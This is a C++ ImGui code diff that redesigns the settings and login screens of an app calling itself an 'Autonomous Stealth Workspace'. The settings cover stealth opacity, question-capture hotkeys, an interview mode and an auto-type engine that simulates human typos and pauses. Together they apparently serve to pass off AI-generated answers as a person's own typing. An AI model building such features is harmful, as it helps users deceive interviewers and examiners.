-            ImGui::RadioButton("Browser", dummy);
-            ImGui::EndDisabled();
-            if (ImGui::IsItemHovered(ImGuiHoveredFlags_AllowWhenDisabled)) {
-                ImGui::SetTooltip("Browser time expired for your tier");
+    // Scrollable container for settings
+    ImGui::BeginChild("SettingsScroll", ImVec2(0.0f, -50.0f), false, 0);
+
+    // ==========================================
+    // 1. APPEARANCE & STEALTH
+    // ==========================================
+    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 1.0f, 1.0f, 0.95f));
+    ImGui::Text("APPEARANCE & STEALTH");
+    ImGui::PopStyleColor();
+    ImGui::Spacing();
+
+    // Accent Palette Swatches
+    ImGui::TextDisabled("Accent Theme:");
+    ImGui::SameLine();
+    
+    struct Swatch { const char* name; ImVec4 col; };
+    static const Swatch swatches[] = {
+        { "Emerald", ImVec4(0.06f, 0.72f, 0.51f, 1.0f) },
+        { "Cyan",    ImVec4(0.02f, 0.71f, 0.83f, 1.0f) },
+        { "Violet",  ImVec4(0.55f, 0.36f, 0.96f, 1.0f) },
+        { "Rose",    ImVec4(0.96f, 0.25f, 0.37f, 1.0f) },
+        { "Amber",   ImVec4(0.96f, 0.62f, 0.04f, 1.0f) },
+        { "Slate",   ImVec4(0.58f, 0.64f, 0.72f, 1.0f) }
+    };
+    for (int i = 0; i < 6; i++) {
+        ImGui::PushID(i);
+        ImGui::PushStyleColor(ImGuiCol_Button, swatches[i].col);
+        ImGui::PushStyleColor(ImGuiCol_ButtonHovered, swatches[i].col);
+        ImGui::PushStyleColor(ImGuiCol_ButtonActive, swatches[i].col);
+        if (ImGui::Button("##swatch", ImVec2(20.0f, 20.0f))) {
+            g_uiColor = swatches[i].col;
+            SaveHotkeys();
+        }
+        if (ImGui::IsItemHovered()) ImGui::SetTooltip("%s", swatches[i].name);
+        ImGui::PopStyleColor(3);
+        ImGui::SameLine(0, 5.0f);
+        ImGui::PopID();
+    }
+    
+    // Custom color picker popup button
+    static bool showColorPopup = false;
+    if (ImGui::SmallButton("Custom...")) {
+        showColorPopup = !showColorPopup;
+    }
+    if (showColorPopup) {
+        ImGui::SetNextItemWidth(140.0f);
+        if (ImGui::ColorEdit3("##custom_col", (float*)&g_uiColor, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_PickerHueWheel)) {
+            SaveHotkeys();
+        }
+    }
+
+    ImGui::Spacing();
+
+    // Opacity sliders with responsive label spacing
+    float labelColW = 145.0f;
+    ImGui::AlignTextToFramePadding();
+    ImGui::Text("Window Opacity:"); ImGui::SameLine(labelColW);
+    ImGui::SetNextItemWidth(110.0f);
+    if (ImGui::SliderFloat("##alpha", &g_windowAlpha, 0.25f, 1.0f, "%.2f")) {
+        SaveHotkeys();
+    }
+    ImGui::SameLine();
+    ImGui::TextDisabled("(%d%%)", (int)(g_windowAlpha * 100.0f));
+
+    ImGui::AlignTextToFramePadding();
+    ImGui::Text("Dual Stealth Opacity:"); ImGui::SameLine(labelColW);
+    ImGui::SetNextItemWidth(110.0f);
+    if (ImGui::SliderFloat("##duel_alpha", &g_duelAlpha, 0.25f, 0.98f, "%.2f")) {
+        SaveHotkeys();
+    }
+    ImGui::SameLine();
+    ImGui::TextDisabled("(%d%% stealth)", (int)(g_duelAlpha * 100.0f));
+
+    // Chat History toggle
+    ImGui::AlignTextToFramePadding();
+    ImGui::Text("Save Chat History:"); ImGui::SameLine(labelColW);
+    if (MiniModifierCheckbox("##chathistory", &g_chatHistoryEnabled)) {
+        SaveHotkeys();
+    }
+    ImGui::SameLine();
+    ImGui::TextDisabled("(Desktop/Ofradr-chat-history)");
+
+    ImGui::Spacing();
+    ImGui::Separator();
+    ImGui::Spacing();
+
+    // ==========================================
+    // 2. GLOBAL SHORTCUTS (CLEAN RESPONSIVE TABLE)
+    // ==========================================
+    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 1.0f, 1.0f, 0.95f));
+    ImGui::Text("GLOBAL SHORTCUTS");
+    ImGui::PopStyleColor();
+    ImGui::TextDisabled("Configure hotkeys. Click the key badge to record a new key.");
+    ImGui::Spacing();
+
+    // Active key recording banner
+    if (g_isBindingKey && g_targetBinding) {
+        ImGui::PushStyleColor(ImGuiCol_ChildBg, ImVec4(g_uiColor.x * 0.15f, g_uiColor.y * 0.15f, g_uiColor.z * 0.15f, 0.95f));
+        ImGui::PushStyleColor(ImGuiCol_Border, GetAccentColorU32(0.9f));
+        ImGui::PushStyleVar(ImGuiStyleVar_ChildRounding, 6.0f);
+        ImGui::PushStyleVar(ImGuiStyleVar_ChildBorderSize, 1.2f);
+        ImGui::BeginChild("##recording_banner", ImVec2(0.0f, 32.0f), true, ImGuiWindowFlags_NoScrollbar);
+        ImGui::AlignTextToFramePadding();
+        ImGui::TextColored(g_uiColor, "RECORDING: Press any key (or Esc to cancel)");
+        ImGui::SameLine(ImGui::GetContentRegionAvail().x - 60.0f);
+        if (ImGui::SmallButton("Cancel##bind")) {
+            g_isBindingKey = false;
+            g_targetBinding = nullptr;
+        }
+        ImGui::EndChild();
+        ImGui::PopStyleVar(2);
+        ImGui::PopStyleColor(2);
+        ImGui::Spacing();
+    }
+
+    // Modern structured table for shortcuts
+    if (ImGui::BeginTable("##shortcuts_table", 3, ImGuiTableFlags_NoSavedSettings | ImGuiTableFlags_SizingStretchProp)) {
+        ImGui::TableSetupColumn("Action", ImGuiTableColumnFlags_WidthStretch);
+        ImGui::TableSetupColumn("Modifiers", ImGuiTableColumnFlags_WidthFixed, 96.0f);
+        ImGui::TableSetupColumn("Key", ImGuiTableColumnFlags_WidthFixed, 66.0f);
+
+        auto RenderHotkeyRow = [](const char* name, HotkeyConfig& hk) {
+            ImGui::TableNextRow(0, 26.0f);
+            ImGui::PushID(name);
+
+            // Column 0: Action Name
+            ImGui::TableSetColumnIndex(0);
+            ImGui::AlignTextToFramePadding();
+            ImGui::TextUnformatted(name);
+
+            // Column 1: Modifiers (C [ ]  A [ ]  S [ ])
+            ImGui::TableSetColumnIndex(1);
+            ImGui::AlignTextToFramePadding();
+            ImGui::TextDisabled("C"); ImGui::SameLine(0, 2.0f); MiniModifierCheckbox("##c", &hk.ctrl); ImGui::SameLine(0, 6.0f);
+            ImGui::TextDisabled("A"); ImGui::SameLine(0, 2.0f); MiniModifierCheckbox("##a", &hk.alt);  ImGui::SameLine(0, 6.0f);
+            ImGui::TextDisabled("S"); ImGui::SameLine(0, 2.0f); MiniModifierCheckbox("##s", &hk.shift);
+
+            // Column 2: Key Badge Button
+            ImGui::TableSetColumnIndex(2);
+            bool isBinding = (g_isBindingKey && g_targetBinding == &hk);
+            char kbuf[32] = { 0 };
+
+            if (isBinding) {
+                strcpy(kbuf, "...");
+                ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.85f, 0.20f, 0.20f, 0.9f));
+                ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.95f, 0.30f, 0.30f, 1.0f));
+                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 1.0f, 1.0f, 1.0f));
+            } else {
+                std::string kn = GetKeyName(hk.vkCode);
+                if (kn.empty()) kn = "-";
+                // Friendly short names for display to prevent awkward cut-offs
+                if (kn == "Backspace") kn = "Bksp";
+                else if (kn == "Delete") kn = "Del";
+                else if (kn == "Insert") kn = "Ins";
+                else if (kn == "Page Up" || kn == "PageUp") kn = "PgUp";
+                else if (kn == "Page Down" || kn == "PageDown") kn = "PgDn";
+                else if (kn == "Escape") kn = "Esc";
+                else if (kn == "Num Lock") kn = "Num";
+                else if (kn == "Caps Lock") kn = "Caps";
+                if (kn.length() > 7) kn = kn.substr(0, 7);
+                strcpy(kbuf, kn.c_str());
+
+                ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.18f, 0.21f, 0.28f, 0.95f));
+                ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(g_uiColor.x * 0.40f, g_uiColor.y * 0.40f, g_uiColor.z * 0.40f, 1.0f));
+                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.92f, 0.94f, 0.98f, 0.95f));
             }
-        } else {
-            if (ImGui::RadioButton("Browser", g_appMode == AppMode::Browser)) { DeactivateDuelMode(); g_appMode = AppMode::Browser; }
-        }
-    }
-    ImGui::SameLine();
-    if (ImGui::RadioButton("Chat", g_appMode == AppMode::Chat)) { DeactivateDuelMode(); g_appMode = AppMode::Chat; }
-    ImGui::SameLine();
-    if (ImGui::RadioButton("Interview", g_appMode == AppMode::Interview)) { DeactivateDuelMode(); g_appMode = AppMode::Interview; }
-    ImGui::SameLine();
-    if (ImGui::RadioButton("Agent", g_appMode == AppMode::Agent)) { DeactivateDuelMode(); g_appMode = AppMode::Agent; }
-    ImGui::SameLine();
-    if (ImGui::RadioButton("Dual", g_appMode == AppMode::Duel)) ActivateDuelMode();
-    ImGui::EndChild();
-    ImGui::Spacing();
 
-    // --- FIX: Scrollable Settings Container ---
-    // Using 0 as flag instead of undefined flag
-    ImGui::BeginChild("SettingsScroll", ImVec2(0.0f, -60.0f), false, 0);
+            ImGui::PushStyleVar(ImGuiStyleVar_FrameRounding, 5.0f);
+            ImGui::PushStyleVar(ImGuiStyleVar_FramePadding, ImVec2(4.0f, 2.0f));
+            if (ImGui::Button(kbuf, ImVec2(62.0f, 22.0f))) {
+                if (!g_isBindingKey) {
+                    g_isBindingKey = true;
+                    g_targetBinding = &hk;
+                } else {
+                    g_isBindingKey = false;
+                    g_targetBinding = nullptr;
+                }
+            }
+            if (ImGui::IsItemHovered()) {
+                if (isBinding) ImGui::SetTooltip("Press any key to assign, or click to cancel");
+                else ImGui::SetTooltip("Click to assign new key");
+            }
+            ImGui::PopStyleVar(2);
+            ImGui::PopStyleColor(3);
 
-    ImGui::BeginChild("Box1", ImVec2(0.0f, 220.0f), true);
-    ImGui::Text("Interface Color");
-    ImGui::SetNextItemWidth(150.0f);
-    ImGuiColorEditFlags pickerFlags = ImGuiColorEditFlags_PickerHueWheel | ImGuiColorEditFlags_NoSidePreview | ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoAlpha;
-    ImGui::ColorPicker3("##picker", (float*)&g_uiColor, pickerFlags);
-    ImGui::EndChild();
-    ImGui::Spacing();
+            ImGui::PopID();
+        };
 
-    ImGui::BeginChild("Box2", ImVec2(0.0f, 80.0f), true);
-    HotkeyWidget("Toggle Visibility (Global)", g_hkToggle);
-    ImGui::EndChild();
-    ImGui::Spacing();
+        RenderHotkeyRow("Toggle Visibility", g_hkToggle);
+        RenderHotkeyRow("Capture Screen", g_hkScreenshot);
+        RenderHotkeyRow("Send Message", g_hkSend);
+        RenderHotkeyRow("Inspect Window", g_hkInspect);
+        RenderHotkeyRow("Dual Mode HUD", g_hkDuel);
+        RenderHotkeyRow("Dual Recapture", g_hkDuelCapture);
+        RenderHotkeyRow("Exit Dual Mode", g_hkQuitDuel);
+        RenderHotkeyRow("Paste to Browser", g_hkPaste);
+        RenderHotkeyRow("Auto-Type Text", g_hkAutoType);
+        RenderHotkeyRow("Auto-Type Code", g_hkAutoTypeCodeOnly);
 
-    ImGui::BeginChild("Box3", ImVec2(0.0f, 80.0f), true);
-    HotkeyWidget("Take Screenshot", g_hkScreenshot);
-    ImGui::EndChild();
-    ImGui::Spacing();
-
-    ImGui::BeginChild("BoxSend", ImVec2(0.0f, 80.0f), true);
-    HotkeyWidget("Send Message", g_hkSend);
-    ImGui::EndChild();
-    ImGui::Spacing();
-
-    ImGui::BeginChild("BoxInspect", ImVec2(0.0f, 80.0f), true);
-    HotkeyWidget("Inspect Window", g_hkInspect);
-    ImGui::EndChild();
-    ImGui::Spacing();
-
-    ImGui::BeginChild("BoxPaste", ImVec2(0.0f, 80.0f), true);
-    HotkeyWidget("Paste Screenshot to Browser", g_hkPaste);
-    ImGui::EndChild();
-    ImGui::Spacing();
-
-    ImGui::BeginChild("BoxDuel", ImVec2(0.0f, 80.0f), true);
-    HotkeyWidget("Dual Mode", g_hkDuel);
-    ImGui::EndChild();
-    ImGui::Spacing();
-
-    ImGui::BeginChild("BoxDuelCapture", ImVec2(0.0f, 80.0f), true);
-    HotkeyWidget("Capture Question (Dual)", g_hkDuelCapture);
-    ImGui::EndChild();
-    ImGui::Spacing();
-
-    ImGui::BeginChild("BoxHideDuel", ImVec2(0.0f, 80.0f), true);
-    HotkeyWidget("Exit Dual Mode", g_hkQuitDuel);
-    ImGui::EndChild();
-    ImGui::Spacing();
-
-    // --- TRANSPARENCY SLIDER ---
-    ImGui::BeginChild("BoxTrans", ImVec2(0.0f, 60.0f), true);
-    ImGui::Text("Window Opacity");
-    ImGui::SetNextItemWidth(150.0f);
-    if (ImGui::SliderFloat("##alpha", &g_windowAlpha, 0.2f, 1.0f, "%.2f")) {
-        SaveHotkeys();
+        ImGui::EndTable();
     }
 
-    ImGui::EndChild();
     ImGui::Spacing();
-    // ---------------------------
-
-    ImGui::BeginChild("BoxTelegram", ImVec2(0.0f, 200.0f), true);
-    ImGui::TextColored(g_uiColor, "TELEGRAM REMOTE CONTROL");
     ImGui::Separator();
     ImGui::Spacing();
-    static char tokenBuf[256] = "";
-    if (tokenBuf[0] == '\0' && !Agent::GetTelegramToken().empty()) {
-        strncpy(tokenBuf, Agent::GetTelegramToken().c_str(), sizeof(tokenBuf) - 1);
-    }
-    ImGui::Text("Bot Token:");
-    ImGui::SetNextItemWidth(-1);
-    if (ImGui::InputText("##tgtoken", tokenBuf, sizeof(tokenBuf))) {
-        Agent::SetTelegramToken(tokenBuf);
-    }
-    static char chatIdBuf[64] = "";
-    if (chatIdBuf[0] == '\0' && !Agent::GetTelegramChatId().empty()) {
-        strncpy(chatIdBuf, Agent::GetTelegramChatId().c_str(), sizeof(chatIdBuf) - 1);
-    }
-    ImGui::Text("Chat ID:");
-    ImGui::SetNextItemWidth(-1);
-    if (ImGui::InputText("##tgchatid", chatIdBuf, sizeof(chatIdBuf))) {
-        Agent::SetTelegramChatId(chatIdBuf);
-    }
-    bool enabled = Agent::IsTelegramEnabled();
-    if (NeonCheckbox("##tgenabled", &enabled)) {
-        Agent::SetTelegramEnabled(enabled);
-        SaveHotkeys();
-        if (enabled && !Agent::IsPolling()) {
-            Agent::StartPolling();
-        } else if (!enabled) {
-            Agent::StopPolling();
-        }
-    }
-    ImGui::SameLine();
-    ImGui::Text("Enable Telegram");
-    ImGui::SameLine();
-    ImGui::TextDisabled(Agent::IsPolling() ? "(Connected)" : "(Disconnected)");
-    if (ImGui::Button("Save & Connect", ImVec2(-1, 28))) {
-        Agent::SetTelegramToken(tokenBuf);
-        Agent::SetTelegramChatId(chatIdBuf);
-        SaveHotkeys();
-        if (Agent::IsTelegramEnabled()) {
-            Agent::StopPolling();
-            Sleep(200);
-            Agent::StartPolling();
-        }
-    }
-    ImGui::EndChild();
-    ImGui::Spacing();
 
-    // --- CHAT HISTORY TOGGLE ---
-    ImGui::BeginChild("BoxHistory", ImVec2(0.0f, 60.0f), true);
-    ImGui::Text("Chat History"); ImGui::SameLine();
-    if (NeonCheckbox("##chathistory", &g_chatHistoryEnabled)) {
-        SaveHotkeys();
-    }
-    ImGui::SameLine();
-    ImGui::TextDisabled("(Saves to Desktop/Ofradr-chat-history)");
-    ImGui::EndChild();
-    ImGui::Spacing();
-    // ---------------------------
-
-    ImGui::BeginChild("Box4", ImVec2(0.0f, 70.0f), true);
-    ImGui::TextDisabled("Status Information");
-    ImGui::Text("Version: %s", CURRENT_APP_VERSION.c_str());
-    ImGui::Text("State: %s", g_appState == AppState::LoggedIn ? "Authenticated" : "Locked");
-    ImGui::EndChild();
-    ImGui::Spacing();
-
-    ImGui::BeginChild("BoxInterview", ImVec2(0.0f, 170.0f), true);
-    ImGui::TextColored(g_uiColor, "INTERVIEW MODE");
+    // ==========================================
+    // 3. HUMAN AUTO-TYPE ENGINE (RESTORED)
+    // ==========================================
+    ImGui::PushStyleColor(ImGuiCol_Text, g_uiColor);
+    ImGui::Text("HUMAN AUTO-TYPE ENGINE");
+    ImGui::PopStyleColor();
     ImGui::Separator();
-    static char interviewPathBuf[512] = "";
-    static bool interviewPathInit = false;
-    if (!interviewPathInit) {
-        std::string p = g_interviewModelPath.empty() ? GetDefaultInterviewModelPath() : g_interviewModelPath;
-        strncpy(interviewPathBuf, p.c_str(), sizeof(interviewPathBuf) - 1);
-        interviewPathInit = true;
+    ImGui::Spacing();
+
+    ImGui::Text("Typing Speed Preset:");
+    if (ImGui::RadioButton("Relaxed (~35 WPM)", g_autoTypeSpeedPreset == 0)) { g_autoTypeSpeedPreset = 0; g_autoTypeCharDelay = 55; SaveHotkeys(); }
+    ImGui::SameLine();
+    if (ImGui::RadioButton("Natural (~55 WPM)", g_autoTypeSpeedPreset == 1)) { g_autoTypeSpeedPreset = 1; g_autoTypeCharDelay = 32; SaveHotkeys(); }
+    ImGui::SameLine();
+    if (ImGui::RadioButton("Fast (~85 WPM)", g_autoTypeSpeedPreset == 2)) { g_autoTypeSpeedPreset = 2; g_autoTypeCharDelay = 18; SaveHotkeys(); }
+    ImGui::SameLine();
+    if (ImGui::RadioButton("Custom", g_autoTypeSpeedPreset == 3)) { g_autoTypeSpeedPreset = 3; SaveHotkeys(); }
+
+    if (g_autoTypeSpeedPreset == 3) {
+        ImGui::Text("Base Keystroke Delay:");
+        ImGui::SetNextItemWidth(180.0f);
+        if (ImGui::SliderInt("##baseDelay", &g_autoTypeCharDelay, 10, 100, "%d ms")) {
+            SaveHotkeys();
+        }
     }
-    ImGui::Text("Model Path (Temp):");
-    ImGui::SetNextItemWidth(-1);
-    if (ImGui::InputText("##interview_model_path", interviewPathBuf, sizeof(interviewPathBuf))) {
-        g_interviewModelPath = interviewPathBuf;
-        StopInterviewModeRuntime();
-        SaveHotkeys();
-    }
-    ImGui::Text("Model Arch (0..5, default 5):");
-    ImGui::SetNextItemWidth(120.0f);
-    if (ImGui::InputInt("##interview_arch", &g_interviewModelArch)) {
-        if (g_interviewModelArch < 0) g_interviewModelArch = 0;
-        if (g_interviewModelArch > 5) g_interviewModelArch = 5;
-        StopInterviewModeRuntime();
-        SaveHotkeys();
-    }
-    if (NeonCheckbox("##interview_autodl", &g_interviewAutoDownload)) {
+
+    ImGui::Spacing();
+    ImGui::Text("Intelligent Auto-Type Filters & Realism:");
+
+    if (NeonCheckbox("##codeOnlyToggle", &g_autoTypeCodeOnly)) {
         SaveHotkeys();
     }
     ImGui::SameLine();
-    ImGui::Text("Auto-download model to temp/ofradr");
-    if (ImGui::Button("Reset Temp Path", ImVec2(-1, 26))) {
-        g_interviewModelPath = GetDefaultInterviewModelPath();
-        strncpy(interviewPathBuf, g_interviewModelPath.c_str(), sizeof(interviewPathBuf) - 1);
-        StopInterviewModeRuntime();
+    ImGui::Text("Code-Only by Default (Filter conversational AI talk)");
+
+    if (NeonCheckbox("##smartIndentToggle", &g_autoTypeSmartIndent)) {
         SaveHotkeys();
     }
-    ImGui::TextDisabled("Status: %s", g_interviewStatus.c_str());
-    if (!g_interviewError.empty()) {
-        ImGui::TextColored(ImVec4(0.95f, 0.35f, 0.35f, 1.0f), "%s", g_interviewError.c_str());
+    ImGui::SameLine();
+    ImGui::Text("Smart Indentation (Prevent double indents in code editors)");
+
+    if (NeonCheckbox("##tokenBurstsToggle", &g_autoTypeTokenBursts)) {
+        SaveHotkeys();
     }
-    ImGui::EndChild();
+    ImGui::SameLine();
+    ImGui::Text("Syntax Token Bursts (Muscle-memory typing on keywords)");
+
+    if (NeonCheckbox("##naturalPauses", &g_autoTypeNaturalPauses)) {
+        SaveHotkeys();
+    }
+    ImGui::SameLine();
+    ImGui::Text("Natural Thinking Pauses & Code Rhythm");
+
+    if (NeonCheckbox("##typosEnabled", &g_autoTypeTyposEnabled)) {
+        SaveHotkeys();
+    }
+    ImGui::SameLine();
+    ImGui::Text("Simulate Authentic Human Typos & Correction");
+
+    if (g_autoTypeTyposEnabled) {
+        ImGui::SetCursorPosX(36.0f);
+        ImGui::SetNextItemWidth(160.0f);
+        if (ImGui::SliderFloat("Typo Frequency (%)##typoRate", &g_autoTypeTypoRate, 0.2f, 5.0f, "%.1f %%")) {
+            SaveHotkeys();
+        }
+    }
+
+    ImGui::Spacing();
+    ImGui::Separator();
     ImGui::Spacing();
 
+    // ==========================================
+    // 3. INTEGRATIONS & SYSTEM
+    // ==========================================
+    if (ImGui::CollapsingHeader("Telegram Remote Control")) {
+        static char tokenBuf[256] = "";
+        if (tokenBuf[0] == '\0' && !Agent::GetTelegramToken().empty()) {
+            strncpy(tokenBuf, Agent::GetTelegramToken().c_str(), sizeof(tokenBuf) - 1);
+        }
+        ImGui::Text("Bot Token:");
+        ImGui::SetNextItemWidth(-1);
+        if (ImGui::InputText("##tgtoken", tokenBuf, sizeof(tokenBuf))) {
+            Agent::SetTelegramToken(tokenBuf);
+        }
+        static char chatIdBuf[64] = "";
+        if (chatIdBuf[0] == '\0' && !Agent::GetTelegramChatId().empty()) {
+            strncpy(chatIdBuf, Agent::GetTelegramChatId().c_str(), sizeof(chatIdBuf) - 1);
+        }
+        ImGui::Text("Chat ID:");
+        ImGui::SetNextItemWidth(-1);
+        if (ImGui::InputText("##tgchatid", chatIdBuf, sizeof(chatIdBuf))) {
+            Agent::SetTelegramChatId(chatIdBuf);
+        }
+        bool enabled = Agent::IsTelegramEnabled();
+        if (NeonCheckbox("##tgenabled", &enabled)) {
+            Agent::SetTelegramEnabled(enabled);
+            SaveHotkeys();
+            if (enabled && !Agent::IsPolling()) Agent::StartPolling();
+            else if (!enabled) Agent::StopPolling();
+        }
+        ImGui::SameLine();
+        ImGui::Text("Enable Telegram Polling");
+        ImGui::SameLine();
+        ImGui::TextDisabled(Agent::IsPolling() ? "(Connected)" : "(Disconnected)");
+        if (ImGui::Button("Save & Reconnect", ImVec2(-1, 26))) {
+            Agent::SetTelegramToken(tokenBuf);
+            Agent::SetTelegramChatId(chatIdBuf);
+            SaveHotkeys();
+            if (Agent::IsTelegramEnabled()) {
+                Agent::StopPolling();
+                Sleep(200);
+                Agent::StartPolling();
+            }
+        }
+        ImGui::Spacing();
+    }
 
+    if (ImGui::CollapsingHeader("Interview Model Settings")) {
+        static char interviewPathBuf[512] = "";
+        static bool interviewPathInit = false;
+        if (!interviewPathInit) {
+            std::string p = g_interviewModelPath.empty() ? GetDefaultInterviewModelPath() : g_interviewModelPath;
+            strncpy(interviewPathBuf, p.c_str(), sizeof(interviewPathBuf) - 1);
+            interviewPathInit = true;
+        }
+        ImGui::Text("Model Path:");
+        ImGui::SetNextItemWidth(-1);
+        if (ImGui::InputText("##interview_model_path", interviewPathBuf, sizeof(interviewPathBuf))) {
+            g_interviewModelPath = interviewPathBuf;
+            StopInterviewModeRuntime();
+            SaveHotkeys();
+        }
+        ImGui::Text("Model Arch (0..5):"); ImGui::SameLine();
+        ImGui::SetNextItemWidth(80.0f);
+        if (ImGui::InputInt("##interview_arch", &g_interviewModelArch)) {
+            if (g_interviewModelArch < 0) g_interviewModelArch = 0;
+            if (g_interviewModelArch > 5) g_interviewModelArch = 5;
+            StopInterviewModeRuntime();
+            SaveHotkeys();
+        }
+        if (NeonCheckbox("##interview_autodl", &g_interviewAutoDownload)) {
+            SaveHotkeys();
+        }
+        ImGui::SameLine();
+        ImGui::Text("Auto-download model to temp");
+        ImGui::TextDisabled("Status: %s", g_interviewStatus.c_str());
+        ImGui::Spacing();
+    }
 
-    ImGui::EndChild(); // End Scroll Container
+    // System Info
+    ImGui::Spacing();
+    ImGui::TextDisabled("Tier: %s  |  State: %s  |  Version: %s",
+        g_userTier.empty() ? "Free" : g_userTier.c_str(),
+        g_appState == AppState::LoggedIn ? "Authenticated" : "Locked",
+        CURRENT_APP_VERSION.c_str());
+
+    ImGui::EndChild(); // SettingsScroll
+}
+
+void RenderLoginPage(bool& done) {
+    float winW = ImGui::GetWindowWidth();
+    float winH = ImGui::GetWindowHeight();
+
+    float cardW = 360.0f;
+    if (cardW > winW - 32.0f) cardW = winW - 32.0f;
+    float cardH = 330.0f;
+    float cardX = (winW - cardW) * 0.5f;
+    float cardY = (winH - cardH) * 0.5f;
+    if (cardY < 20.0f) cardY = 20.0f;
+
+    ImDrawList* draw = ImGui::GetWindowDrawList();
+    ImVec2 cMin = ImVec2(cardX, cardY);
+    ImVec2 cMax = ImVec2(cardX + cardW, cardY + cardH);
+
+    // Deep frosted card background & subtle glow border
+    draw->AddRectFilled(cMin, cMax, IM_COL32(14, 16, 22, 235), 14.0f);
+    draw->AddRect(cMin - ImVec2(1.5f, 1.5f), cMax + ImVec2(1.5f, 1.5f), GetAccentColorU32(0.12f), 15.0f, 0, 1.5f);
+    draw->AddRect(cMin, cMax, GetAccentColorU32(0.35f), 14.0f, 0, 1.0f);
+
+    float contentW = cardW - 48.0f;
+    float startX = cardX + 24.0f;
+    float startY = cardY + 24.0f;
+    ImGui::SetCursorPos(ImVec2(startX, startY));
+    ImGui::BeginGroup();
+
+    // Brand Title & Subtitle
+    const char* title = "HOPE";
+    ImVec2 titleSz = ImGui::CalcTextSize(title);
+    ImGui::SetCursorPosX(cardX + (cardW - titleSz.x) * 0.5f);
+    ImGui::TextColored(g_uiColor, "%s", title);
+
+    const char* subtitle = "Autonomous Stealth Workspace";
+    ImVec2 subSz = ImGui::CalcTextSize(subtitle);
+    ImGui::SetCursorPosX(cardX + (cardW - subSz.x) * 0.5f);
+    ImGui::TextDisabled("%s", subtitle);
+
+    ImGui::Spacing();
+    ImGui::Separator();
+    ImGui::Spacing();
+
+    if (g_checkingVersion) {
+        ImGui::SetCursorPosX(cardX + (cardW - 120.0f) * 0.5f);
+        ImGui::TextColored(ImVec4(1.0f, 0.85f, 0.2f, 1.0f), "Connecting...");
+        DrawThinkingLoader();
+    }
+    else if (g_updateRequired) {
+        ImGui::TextColored(ImVec4(1.0f, 0.3f, 0.3f, 1.0f), "MANDATORY UPDATE REQUIRED");
+        ImGui::Spacing();
+        ImGui::TextWrapped("A newer version of Hope is available. Please update to continue.");
+        ImGui::Spacing();
+        if (NeoWaveButton("DOWNLOAD UPDATE", ImVec2(contentW, 42.0f))) {
+            if (Api::LaunchMandatoryUpdateInstaller()) done = true;
+            else g_statusMessage = "Failed to launch installer.";
+        }
+    }
+    else {
+        // Status banner
+        if (!g_statusMessage.empty() && g_statusMessage != "Ready.") {
+            bool isErr = (g_statusMessage.find("Failed") != std::string::npos ||
+                          g_statusMessage.find("Invalid") != std::string::npos ||
+                          g_statusMessage.find("Error") != std::string::npos);
+            ImVec4 statCol = isErr ? ImVec4(1.0f, 0.35f, 0.35f, 1.0f) : ImVec4(1.0f, 0.85f, 0.2f, 1.0f);
+            ImGui::SetCursorPosX(startX);
+            ImGui::TextColored(statCol, "%s", g_statusMessage.c_str());
+            ImGui::Spacing();
+        }
+
+        static bool s_showPassword = false;
+        const float fieldH = 40.0f;
+        const float fieldRounding = 7.0f;
+
+        // Custom Helper for Consistent Form Field
+        auto RenderLoginField = [&](const char* id, const char* placeholder, std::string& buf, FocusState myFocus, bool isPass) {
+            ImVec2 pos = ImGui::GetCursorScreenPos();
+            bool focused = (g_currentFocus == myFocus);
+            ImU32 borderCol = focused ? GetAccentColorU32() : IM_COL32(50, 56, 70, 255);
+            ImU32 bgCol = IM_COL32(20, 22, 28, 220);
+
+            draw->AddRectFilled(pos, pos + ImVec2(contentW, fieldH), bgCol, fieldRounding);
+            draw->AddRect(pos, pos + ImVec2(contentW, fieldH), borderCol, fieldRounding, 0, focused ? 1.4f : 1.0f);
+
+            // Hitbox for clicking to focus
+            float textAvailW = isPass ? (contentW - 44.0f) : (contentW - 16.0f);
+            ImGui::PushID(id);
+            if (ImGui::InvisibleButton("##hit", ImVec2(textAvailW, fieldH))) {
+                g_currentFocus = myFocus;
+            }
+            ImGui::PopID();
+
+            // Render text or placeholder
+            float textY = pos.y + (fieldH - ImGui::GetTextLineHeight()) * 0.5f;
+            if (buf.empty()) {
+                draw->AddText(ImVec2(pos.x + 14.0f, textY), IM_COL32(110, 115, 130, 255), placeholder);
+            } else {
+                std::string disp = (isPass && !s_showPassword) ? std::string(buf.size(), '*') : buf;
+                draw->PushClipRect(pos + ImVec2(10.0f, 2.0f), pos + ImVec2(textAvailW, fieldH - 2.0f), true);
+                draw->AddText(ImVec2(pos.x + 14.0f, textY), IM_COL32(240, 240, 240, 255), disp.c_str());
+                draw->PopClipRect();
+            }
+
+            // Blinking cursor if focused
+            if (focused && ((GetTickCount() / 500) % 2 == 0)) {
+                std::string disp = (isPass && !s_showPassword) ? std::string(buf.size(), '*') : buf;
+                float txtW = ImGui::CalcTextSize(disp.c_str()).x;
+                float curX = pos.x + 14.0f + txtW;
+                if (curX < pos.x + textAvailW) {
+                    draw->AddLine(ImVec2(curX + 1.0f, textY), ImVec2(curX + 1.0f, textY + ImGui::GetTextLineHeight()), GetAccentColorU32(), 1.5f);
+                }
+            }
+
+            // Show / Hide Password toggle button inside field
+            if (isPass) {
+                ImVec2 eyePos = ImVec2(pos.x + contentW - 42.0f, pos.y + (fieldH - 22.0f) * 0.5f);
+                ImGui::SetCursorScreenPos(eyePos);
+                const char* eyeLabel = s_showPassword ? "HIDE##pw" : "SHOW##pw";
+                ImGui::PushStyleVar(ImGuiStyleVar_FrameRounding, 4.0f);
+                ImGui::PushStyleVar(ImGuiStyleVar_FramePadding, ImVec2(5.0f, 2.0f));
+                ImGui::PushStyleColor(ImGuiCol_Button, s_showPassword ? ImVec4(g_uiColor.x * 0.3f, g_uiColor.y * 0.3f, g_uiColor.z * 0.3f, 0.8f) : ImVec4(0.15f, 0.16f, 0.20f, 0.8f));
